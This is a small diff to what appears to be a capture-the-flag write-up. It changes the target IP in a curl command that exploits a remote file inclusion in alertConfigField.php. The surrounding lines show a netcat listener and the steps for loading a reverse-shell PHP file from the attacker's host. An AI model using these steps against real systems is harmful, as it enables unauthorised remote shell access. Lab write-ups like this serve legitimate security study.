@@ -136,7 +136,7 @@ sudo nc -lvnp 87
 STEP 4: Modify the PHP Injection URL:
 
 ```sh
-curl  http://10.10.246.55/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.123.93:80/RS.php
+curl  http://10.10.74.120/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.123.93:80/RS.php
   ```
   
 STEP 5: Upload the PHP file from the localhost using the HTTP server and invoke the listener
